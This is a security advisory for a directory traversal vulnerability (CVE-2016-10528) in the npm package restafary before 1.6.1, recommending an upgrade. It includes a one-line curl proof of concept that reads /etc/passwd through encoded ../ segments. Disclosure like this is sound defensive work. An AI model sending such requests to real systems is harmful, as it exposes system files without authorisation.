# [M] Directory Traversal in restafary

## Summary
Severity: Medium
Advisory: GHSA-xg5r-8j97-2wrj
CVE: CVE-2016-10528
CWE: CWE-22
Ecosystem: npm
Published: 2019-02-18
Source: https://github.com/advisories/GHSA-xg5r-8j97-2wrj
Type: github-advisory

## Affected
- npm: `restafary` — affected >=0 <1.6.1

## Details
Affected versions of `restafary` are susceptible to a directory traversal vulnerability when a root path is specified in the configuration.


Proof of Concept

```
curl -i -s -k  -X 'GET' -H 'Authorization: Basic YWRtaW46cGFzc3dvcmQ=' 'http://localhost:8000/api/v1/fs/..%2f..%2fetc/passwd'
```


## Recommendation

Update to version 1.6.1 or later.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2016-10528
- https://github.com/advisories/GHSA-xg5r-8j97-2wrj
- https://www.npmjs.com/advisories/89
